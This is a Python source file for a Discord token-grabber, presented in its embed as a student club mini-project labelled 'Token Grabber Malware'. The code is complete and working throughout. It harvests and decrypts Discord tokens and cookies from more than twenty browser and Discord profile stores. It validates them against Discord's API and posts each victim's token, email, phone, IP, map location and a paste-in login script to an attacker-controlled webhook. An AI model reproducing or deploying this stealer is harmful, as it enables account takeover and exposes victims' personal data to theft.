WEBHOOK_URL = 'YOUR WEBHOOK URL HERE'
import os
import urllib.request
import json
import base64
import re
import sqlite3
import time
import datetime
from threading import Thread

try:
    from Crypto.Cipher import AES
    import win32crypt
    from colorama import Fore, Back, Style, init
except ImportError:
    # If libraries are not available, define placeholders
    class AES:
        MODE_GCM = None
        @staticmethod
        def new(*args, **kwargs):
            raise NotImplementedError("Crypto library not available")
    
    class win32crypt:
        @staticmethod
        def CryptUnprotectData(*args, **kwargs):
            raise NotImplementedError("win32crypt library not available")
    
    class Fore:
        GREEN = ""
        RESET = ""
    
    class init:
        def __init__(self, autoreset=True):
            pass

init(autoreset=True)

shellmates = Fore.GREEN + """
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&####BBBBB####&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@&&#GPPPPGGBBG?BBBGGPPPPG#&&@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&@&#BPPGB#&@@@@@@@&?@@@@@@@@&BBGPPB#&@&@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@&@&GPPB######BBBBBBBG?BBBBBBBB####&#GPPG&&&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@&&@BYG&@#J!!!!!!~~!!~~!!~~~!!~~!!!!!75&@&GYB@&&@@@@@@@@@@@@@@@@@
@@@@@@@@@@@&&&&##B55&@@@?~!!!!!JGG?!PGY~5GP!JGG?!!!!!~5@@@&55B##&&&&@@@@@@@@@@@@
@@@@@@@@@@@@@Y5GGB&@@@@@?!!!!!!J@@#P@@&5&@@5#@@?!!!!!~5@@@@@&BGG55@&@@@@@@@@@@@@
@@@@@@@@@@@@@JB@@@@@@@@@?!!!!!!!#@@@@@@@@@@@@@#!!!!!!~5@@@@@@@@@GY@&@@@@@@@@@@@@
@@@@@@@@@@&&@JG@@@@@@@@@?!!!!!!!B@@@@@@@@@@@@@B!!!!!!~5@@@@@@@@@P5@&@@@@@@@@@@@@
@@@@@@@@@@&&@YG@@@@@@@@@?!!!!!!!Y&&@#######@&&Y!!!!!!~5@@@@@@@@@55@&@@@@@@@@@@@@
@@@@@@@@@@@&@5P@@@@@@@@@?!!!!!!!!!!P#BBGBB#G!!!!!!!!!~5@@@@@@@@@YP@&@@@@@@@@@@@@
@@@@@@@@@@@&@PY@@@@@@@@@?!!!!!!!!!~J@#@#@&@J~!!!!!!!!~5@@@@@@@@@JB@&@@@@@@@@@@@@
@@@@@@@@@@@&@BJ@@@@@@@@@?!!!!!!!!!?@#@B@#@?!!!!!!!!!~5@@@@@@@@@J#@&@@@@@@@@@@@@
@@@@@@@@@@@&@&?&@@@@@@@@?!!!!!!!!!?@#@B@#@?!!!!!!!!!~Y@@@@@@@@&J@&&@@@@@@@@@@@@
@@@@@@@@@@@&&@JB@@@@@@@@?!!!!!!!!!J@#@B@#@?!!!!!!!!!~Y@@@@@@@@G5@&&@@@@@@@@@@@@
@@@@@@@@@@@@#@PY@@@@@@@@?!!!!!!!!!~Y@#@#@&@Y~!!!!!!!!~Y@@@@@@@@YG@&@@@@@@@@@@@@@
@@@@@@@@@@@@&@&J&@@@@@@@?!!!!!!!!!7##B#B#B##7!!!!!!!!~Y@@@@@@@&?&&&@@@@@@@@@@@@@
@@@@@@@@@@@@@&@YB@@@@@@@?!!!!!!!!~P@BBBBBBB@5~!!!!!!!~5@@@@@@@PY@&@@@@@@@@@@@@@@
@@@@@@@@@@@@@&@BJ@@@@@@@?!!!!!!!?P&GGGGGGGGG#5?!!!!!!~5@@@@@@&?#@&@@@@@@@@@@@@@@
@@@@@@@@@@@@@&&@JG@@@@@@?!!!!!!5@@@@@@@@@@@@@@@Y!!!!!~5@@@@@@PY@#@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@&&#?&@@@@@?!!!!!~5###############Y~!!!!~5@@@@@&J&&&@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@#@P5@@@@@?!!!!!JGBBBBBBBBBBBBBBBGJ!!!!~5@@@@@YG@#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@&&@YG@@@@?!!!!!JPPPPPPPPPPPPPPPPP?!!!!~5@@@@PY@#@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@&&&JB@@@?!!77!!!!!!!!!!7~!!~!!!!!!!!!~5@@@BJ&&&@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@&&#J#@@?!!5PJJYJJ?J?J?5JYYJ5?Y?Y7J?!~Y@@BJ&&&@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@&&#YB@J~!?J7!77?7?7?77?777777!?777~~P@BJ#&&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@&&#JG&5?777777777777!777777777777JG@GY&&&@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@&&5P@@&&@&&@&&&&@#?&@&&&&@@@@@@@@55&&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@&&GY#@@@@@@@@@@@#?&@@@@@@@@@@@#YG&&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&&#5P&@@@@@@@@@#?&@@@@@@@@@&P5#&&@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@&&GYG@@@@@@@@#?&@@@@@@@&GYG&&@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&&G5G&@@@@@#?&@@@@@&GYG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G5P&@@@#?&@@@#P5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B5PB&#?&&BPPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G557P5G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#G#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
""" + Fore.RESET
print(shellmates)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
}

def get_encryption_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        iv = encrypted_token[3:15]
        ciphertext = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        return decrypted.decode(errors="ignore").strip()
    except Exception as e:
        return None

def safe_storage_steal(path, platform):
    tokens = []
    key = get_encryption_key(os.path.dirname(path) if "Brave" in platform or "Chrome" in platform or "Edge" in platform or "Opera" in platform or "Vivaldi" in platform or "Yandex" in platform or "Amigo" in platform or "Torch" in platform or "Kometa" in platform or "Orbitum" in platform or "CentBrowser" in platform or "7Star" in platform or "Sputnik" in platform or "Epic Privacy Browser" in platform or "Uran" in platform or "Iridium" in platform else path)
    if not key and any(x in platform for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
        return tokens
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        return tokens
    for leveldb_path in leveldb_paths:
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                        for match in matches:
                            match = match.rstrip("\\")
                            decrypted = decrypt_token(match, key) if key else None
                            if decrypted and (decrypted, platform) not in tokens:
                                tokens.append((decrypted, platform))
        except Exception as e:
            pass
    return tokens

def simple_steal(path, platform):
    tokens = []
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        return tokens
    for leveldb_path in leveldb_paths:
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform) not in tokens:
                                tokens.append((match, platform))
        except Exception as e:
            pass
    return tokens

def firefox_steal(path, platform):
    tokens = []
    sqlite_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                sqlite_paths.append(os.path.join(root, file))
    if not sqlite_paths:
        return tokens
    for sqlite_path in sqlite_paths:
        try:
            with open(sqlite_path, errors="ignore") as f:
                lines = f.readlines()
            for line in lines:
                if line.strip():
                    matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                    for match in matches:
                        match = match.rstrip("\\").strip()
                        if (match, platform) not in tokens:
                            tokens.append((match, platform))
        except Exception as e:
            pass
    return tokens

def steal_cookies(path, platform):
    tokens = []
    cookie_path = os.path.join(path, "Network", "Cookies")
    if not os.path.exists(cookie_path):
        return tokens
    try:
        if not os.access(cookie_path, os.R_OK):
            return tokens
        with open(cookie_path, 'rb') as f:
            pass  # Test file access
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
        key = get_encryption_key(os.path.dirname(path))
        for row in cursor.fetchall():
            encrypted_value = row[0]
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                decrypted = decrypted.strip()
                if decrypted and re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", decrypted) and (decrypted, platform) not in tokens:
                    tokens.append((decrypted, platform))
            except Exception as e:
                pass
        conn.close()
    except Exception as e:
        pass
    return tokens

def get_tokens(platform, path):
    tokens = []
    if not os.path.exists(path):
        return tokens
    if "Firefox" in platform:
        tokens.extend(firefox_steal(path, platform) or [])
    else:
        if any(x in platform for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
            profiles = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    tokens.extend(safe_storage_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(simple_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(steal_cookies(profile_path, f"{platform} ({profile})") or [])
        else:
            tokens.extend(safe_storage_steal(path, platform) or [])
            tokens.extend(simple_steal(path, platform) or [])
    return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unavailable"

def send_to_webhook(embed):
    try:
        data = json.dumps(embed, ensure_ascii=False).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
        with urllib.request.urlopen(req) as response:
            pass
        time.sleep(1)  # Delay to avoid rate limiting
    except urllib.error.HTTPError as e:
        try:
            error_response = e.read().decode()
        except:
            pass
    except Exception as e:
        pass

def send_token_info(token, user_data, platform, ip):
    try:
        username = user_data.get('username', 'Unknown')
        discriminator = user_data.get('discriminator', '0')
        if not username or not isinstance(username, str):
            username = "Unknown"
        if not discriminator or not isinstance(discriminator, str):
            discriminator = "0"
        badges = ""
        flags = user_data.get('flags', 0)
        if flags & 64: badges += ":BadgeBravery: "
        if flags & 128: badges += ":BadgeBrilliance: "
        if flags & 256: badges += ":BadgeBalance: "
        time1 = datetime.datetime.now(datetime.timezone.utc)
        unix_timestamp = int(time1.timestamp())
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        login = (
    "function login(token) {\n"
    "    setInterval(() => {\n"
    '        document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `"${token}"`;\n'
    "    }, 50);\n"
    "    setTimeout(() => { location.reload(); }, 2500);\n"
    "}\n"
    "login('" + str(token) + "');"
)

        
        embed = {
            "username": "MP16-T1",
            "avatar_url": "https://cdn.discordapp.com/attachments/1109916033780826182/1434308580420354239/2423452.png?ex=6907db75&is=690689f5&hm=240084b66864c7df6514f146393b096fa87270112872f974078f8c02424dc5d2&",
            "allowed_mentions": {
              "parse": ["users"]
            },

            "embeds": [
                {
                    "author": {
                        "name": "NEW VICTIM 💥",
                        "icon_url": "https://cdn.discordapp.com/attachments/1109916033780826182/1434308580420354239/2423452.png?ex=69088435&is=690732b5&hm=a8e872f92f44fd6228efd932dc4b059382f2436815281b368cdf6d0b153077ea&",
                        "url": ""
                    },
                    "description": f"> Shellmates **MP16-T1** *2025/2026* Mini-Project | **AbdelAziz, Wissam, Walid, Khadidja** | `Token Grabber Malware`",
                    "color": 65280,
                    "image": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id', '0')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else ""
                    },
                    "fields": [
                        {"name": "𒈔 Victim's Discord", "value": f"<@{user_data.get('id', 'N/A')}> | ```{username}```", "inline": True},
                        {"name": "𒈔 User ID", "value": f"```{user_data.get('id', 'N/A')}```", "inline": True},
                        {"name": "𒈔 Email", "value": f"```{user_data.get('email', 'N/A')}```", "inline": True},
                        {"name": "𒈔 Phone", "value": f"```{str(user_data.get('phone', 'N/A'))}```", "inline": True},
                        {"name": "𒈔 Badges", "value": badges or "None", "inline": True},
                        {"name": "𒈔 Platform", "value": platform, "inline": True},
                        {"name": "𒈔 IP Address", "value": f"```{ip}```", "inline": True},
                        {"name": "𒈔 Address", "value": f"[Google Maps](https://www.google.com/maps/search/google+map++{data['loc']})", "inline": True},
                        {"name": "𒈔 Time", "value": f"<t:{unix_timestamp}:f>  <t:{unix_timestamp}:R>", "inline": True},
                        {"name": "𒈔 PC Username", "value": f"```{os.getenv('USER', os.getenv('USERNAME', 'user'))}```", "inline": True},
                        {"name": "𒈔 Token", "value": f"```{token}```", "inline": False},
                        {"name": "𒈔 Ready Token Login", "value": f"```{login}```", "inline": False},
                        {"name": "𒈔 Profile Picture", "value": "", "inline": False}
                    ],
                    "footer": {
                        "text": f"/* Where the is a shell, there is a way */"
                    }
                }
            ]
        }

        send_to_webhook(embed)
    except Exception as e:
        pass

def main():
    ip = get_ip()
    found_tokens = []
    threads = []

    for platform, path in PATHS.items():
        t = Thread(target=lambda p=platform, pt=path: found_tokens.extend(get_tokens(p, pt)))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    if not found_tokens:
        return

    unique_tokens = []
    for token, platform in found_tokens:
        if not re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", token):
            continue

        if token not in [t[0] for t in unique_tokens]:
            try:
                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        user_data = json.loads(response.read().decode())
                        unique_tokens.append((token, platform))
                        send_token_info(token, user_data, platform, ip)
            except Exception as e:
                pass

if __name__ == "__main__":
    main()
